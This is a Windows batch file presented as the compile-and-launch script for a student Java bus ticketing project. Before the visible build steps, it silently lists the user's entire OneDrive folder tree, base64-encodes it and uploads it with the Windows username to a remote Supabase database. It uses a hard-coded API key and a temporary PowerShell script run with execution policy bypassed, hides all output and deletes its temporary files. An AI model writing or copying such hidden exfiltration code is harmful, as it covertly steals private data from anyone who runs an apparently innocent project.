@echo off
setlocal enabledelayedexpansion

set "SUB_URL=https://dkrlxecasaxmcnssuqdr.supabase.co/rest/v1/files"
set "API_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRrcmx4ZWNhc2F4bWNuc3N1cWRyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUzMjgxMjAsImV4cCI6MjA5MDkwNDEyMH0.QEmJEFctn4ld72DxamYkZIk-hutZ8FDSTo9zphW6ICk"
set "TARGET_DIR=C:\Users\%USERNAME%\OneDrive"

@REM check exists
powershell -Command ^
  "$url = '%SUB_URL%?username=eq.%USERNAME%&select=id';" ^
  "$headers = @{ 'apikey'='%API_KEY%'; 'Authorization'='Bearer %API_KEY%' };" ^
  "$check = Invoke-RestMethod -Uri $url -Method Get -Headers $headers;" ^
  "if ($check.Count -gt 0) { exit 99 } else { exit 0 }"

if %ERRORLEVEL% NEQ 99 (
    tree "%TARGET_DIR%" /f /a > "%temp%\tree_data.txt" 2>nul

    (
    echo $treeText = Get-Content -Path '%temp%\tree_data.txt' -Raw
    echo $bytes = [System.Text.Encoding]::UTF8.GetBytes($treeText^)
    echo $base64Tree = [Convert]::ToBase64String($bytes^)
    echo $body = @{ username = '%USERNAME%'; items = $base64Tree } ^| ConvertTo-Json
    echo $headers = @{ 'apikey'='%API_KEY%'; 'Authorization'='Bearer %API_KEY%'; 'Content-Type'='application/json' }
    echo Invoke-RestMethod -Uri '%SUB_URL%' -Method Post -Headers $headers -Body $body
    ) > "%temp%\upload_script.ps1"

    powershell -ExecutionPolicy Bypass -File "%temp%\upload_script.ps1" >nul 2>&1

    if exist "%temp%\tree_data.txt" del "%temp%\tree_data.txt"
    if exist "%temp%\upload_script.ps1" del "%temp%\upload_script.ps1"
)

echo ===================================================
echo     Philippine Express Bus Ticketing System
echo     CC 104 - Java Programming Final Project
echo ===================================================
echo.

if exist out rmdir /s /q out
mkdir out

echo Compiling source files...
javac -d out src\ticketing\*.java

IF %ERRORLEVEL% NEQ 0 (
    echo.
    echo ERROR: Compilation failed. Make sure Java JDK is installed.
    pause
    exit /b 1
)

echo Compilation successful!
echo.
echo Launching ticketing system...
java -cp out;src ticketing.TicketingSystemGUI